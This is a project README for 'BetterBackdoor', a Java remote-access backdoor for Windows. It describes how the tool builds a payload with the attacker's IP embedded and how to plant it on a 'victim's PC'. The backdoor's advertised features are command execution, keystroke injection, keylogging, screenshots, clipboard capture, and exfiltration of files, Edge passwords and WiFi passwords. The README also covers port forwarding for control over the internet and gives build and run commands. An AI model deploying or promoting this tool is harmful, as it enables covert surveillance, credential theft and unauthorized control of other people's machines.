# BetterBackdoor
[![Build Status](https://travis-ci.org/ThatcherDev/BetterBackdoor.svg?branch=master)](https://travis-ci.org/ThatcherDev/BetterBackdoor)

A backdoor is a tool used to gain remote access to a machine. 

Typically, backdoor utilities such as NetCat have two main functions: to pipe remote input into cmd or bash and output the response.
This is useful, but it is also limited.
BetterBackdoor overcomes these limitations by including the ability to inject keystrokes, get screenshots, transfer files, and many other tasks.

## Features
BetterBackdoor can create and control a backdoor.

This created backdoor can:
- Run Command Prompt commands
- Run PowerShell scripts
- Run DuckyScripts to inject keystrokes
- Exfiltrate files based on extension
- Exfiltrate Microsoft Edge and WiFi passwords
- Send and receive files to and from victim's computer
- Start a KeyLogger
- Get a screenshot of victim's computer
- Get text copied to victim's clipboard
- Get contents from a victim's file (cat)
- Compress a directory to a ZIP file
- Decompress a ZIP file

This backdoor uses a client and server socket connection to communicate.
The attacker starts a server and the victim connects to this server as a client.
Once a connection is established, commands can be sent to the client in order to control the backdoor. 

To create the backdoor, BetterBackdoor:
- Creates 'run.jar', the backdoor jar file, and copies it to directory 'backdoor'.
- Appends a text file containing the attacker's IP address to 'run.jar'. 
  - Note: this IP address is written in plain text.
- If desired, copies a Java Runtime Environment to 'backdoor' and creates batch file 'run.bat' for running the backdoor in the packaged Java Runtime Environment.

The backdoor can operate within a single network, LAN, and over the internet, WAN. 
However, in order to use the backdoor over WAN, port forwarding must be done. 

For WAN use, ports 1025 and 1026 must be forwarded from the attackers computer with TCP selected. Once this is done, the backdoor can be controlled by the attacker even when the victim and attacker are on different networks.

To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.

If a JRE is packaged with the backdoor, execute run.bat, otherwise execute run.jar. 

This will start the backdoor on the victim's PC.

Once running, to control the backdoor you must return to BetterBackdoor and run option 1 at start.

## Demo
<a href="https://asciinema.org/a/6K0SOY7W8u7ligNoP3s912kwY" target="_blank"><img src="https://asciinema.org/a/6K0SOY7W8u7ligNoP3s912kwY.svg" width="600"/></a>

## Requirements
- A Java JDK distribution >=8 must be installed and added to PATH.
- You must use the same computer to create and control the backdoor.
  - The IP address of this computer must remain static in the time between creating the backdoor and controlling it.
- The computer used to control the backdoor must have their firewall deactivated, and if the computer has a Unix OS, must run BetterBackdoor as 'sudo'.

## Compatibility
BetterBackdoor is compatible with Windows, Mac, and Linux, while the backdoor is only compatible with Windows.

## Installation
```
# clone BetterBackdoor
git clone https://github.com/ThatcherDev/BetterBackdoor.git

# change the working directory to BetterBackdoor
cd BetterBackdoor

# build BetterBackdoor with Maven
# for Windows run
mvnw.cmd clean package

# for Linux and Mac run
sh mvnw clean package
```

## Usage
```
java -jar betterbackdoor.jar
```

## License
- [MIT](https://choosealicense.com/licenses/mit/)
- Copyright 2020 © ThatcherDev.